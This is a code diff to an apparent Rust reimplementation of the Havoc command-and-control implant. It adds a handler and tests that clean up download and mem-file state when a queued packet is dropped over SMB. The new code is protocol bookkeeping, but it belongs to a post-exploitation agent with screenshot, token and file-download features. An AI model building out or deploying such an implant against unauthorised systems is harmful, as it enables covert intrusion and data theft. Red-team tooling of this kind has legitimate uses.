@@ -154,6 +154,9 @@ pub fn dispatch(
         }
         DemonCommand::CommandAssemblyListVersions => handle_assembly_list_versions(),
         DemonCommand::CommandScreenshot => handle_screenshot(),
+        DemonCommand::CommandPackageDropped => {
+            handle_package_dropped(&package.payload, package.request_id, downloads, mem_files)
+        }
         DemonCommand::CommandExit => DispatchResult::Exit,
         // These are agent-to-server callbacks; ignore if received from server.
         DemonCommand::CommandOutput | DemonCommand::BeaconOutput => DispatchResult::Ignore,
@@ -3930,6 +3933,63 @@ fn handle_assembly_list_versions() -> DispatchResult {
     DispatchResult::Respond(Response::new(DemonCommand::CommandAssemblyListVersions, out))
 }
 
+// ─── COMMAND_PACKAGE_DROPPED (2570) ─────────────────────────────────────────
+
+/// Handle `CommandPackageDropped` (ID 2570): a previously queued packet was
+/// dropped (e.g. exceeded the SMB pipe buffer limit).
+///
+/// Incoming payload (LE): `[dropped_package_length: u32][max_length: u32]`
+///
+/// The handler cleans up any in-flight state associated with the request:
+/// downloads whose `request_id` matches are marked for removal, and any
+/// partially-staged mem-files with the same ID are discarded.  No response
+/// packet is generated — this mirrors the original Havoc behaviour where
+/// `RequestCompleted` is deliberately *not* called so the teamserver can
+/// still receive subsequent dropped-package notifications for the same
+/// request.
+fn handle_package_dropped(
+    payload: &[u8],
+    request_id: u32,
+    downloads: &mut DownloadTracker,
+    mem_files: &mut MemFileStore,
+) -> DispatchResult {
+    let mut offset = 0;
+
+    let dropped_length = match parse_u32_le(payload, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("CommandPackageDropped: failed to parse dropped_length: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let max_length = match parse_u32_le(payload, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("CommandPackageDropped: failed to parse max_length: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    warn!(request_id, dropped_length, max_length, "package dropped — cleaning up in-flight state");
+
+    // Mark any active downloads associated with this request for removal.
+    let removed_downloads = downloads.mark_removed_by_request_id(request_id);
+    if removed_downloads > 0 {
+        info!(request_id, removed_downloads, "marked downloads for removal after package drop");
+    }
+
+    // Discard any partially-staged mem-file keyed by this request ID.
+    if mem_files.remove(&request_id).is_some() {
+        info!(request_id, "removed in-flight mem-file after package drop");
+    }
+
+    // No response — the original Havoc handler deliberately does not call
+    // RequestCompleted, because multiple dropped-package callbacks can arrive
+    // for a single request.
+    DispatchResult::Ignore
+}
+
 // ─── Payload parsing helpers (server → agent, little-endian) ─────────────────
 
 /// Parse a `u32` in little-endian byte order from `buf[*offset..]`.
@@ -7589,5 +7649,122 @@ mod tests {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandAssemblyListVersions));
+    }
+
+    // ── CommandPackageDropped ────────────────────────────────────────────────
+
+    #[test]
+    fn dispatch_routes_package_dropped_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let payload = le_u32_pair(0x20000, 0x10000); // dropped=128KB, max=64KB
+        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 42, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn package_dropped_marks_matching_downloads_for_removal() {
+        let mut config = SpecterConfig::default();
+        let mut downloads = DownloadTracker::new();
+
+        // Create a temp file to register as a download.
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!("specter_pkg_drop_{}", rand::random::<u32>()));
+        std::fs::write(&path, b"data").expect("write temp");
+        let file = std::fs::File::open(&path).expect("open temp");
+        let file_id = downloads.add(file, 99, 4); // request_id=99
+
+        let payload = le_u32_pair(0x20000, 0x10000);
+        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Ignore));
+
+        // The download should now be marked for removal.
+        let entry = downloads.get(file_id).expect("entry should still exist before push");
+        assert_eq!(entry.state, DownloadState::Remove);
+        let _ = std::fs::remove_file(path);
+    }
+
+    #[test]
+    fn package_dropped_removes_matching_memfile() {
+        let mut config = SpecterConfig::default();
+        let mut mem_files: MemFileStore = HashMap::new();
+        mem_files.insert(55, MemFile { expected_size: 1024, data: vec![0u8; 512] });
+
+        let payload = le_u32_pair(0x20000, 0x10000);
+        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 55, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut mem_files,
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Ignore));
+        assert!(mem_files.get(&55).is_none(), "mem-file should have been removed");
+    }
+
+    #[test]
+    fn package_dropped_ignores_short_payload() {
+        let mut config = SpecterConfig::default();
+        let payload = vec![0x00, 0x01, 0x00]; // only 3 bytes, not enough for two u32s
+        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn package_dropped_does_not_affect_unrelated_downloads() {
+        let mut config = SpecterConfig::default();
+        let mut downloads = DownloadTracker::new();
+
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!("specter_pkg_drop_unrel_{}", rand::random::<u32>()));
+        std::fs::write(&path, b"data").expect("write temp");
+        let file = std::fs::File::open(&path).expect("open temp");
+        let file_id = downloads.add(file, 100, 4); // request_id=100
+
+        // Package dropped for request_id=99 — should NOT affect download with request_id=100.
+        let payload = le_u32_pair(0x20000, 0x10000);
+        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);
+        dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+
+        let entry = downloads.get(file_id).expect("entry should exist");
+        assert_eq!(entry.state, DownloadState::Running);
+        let _ = std::fs::remove_file(path);
     }
 }
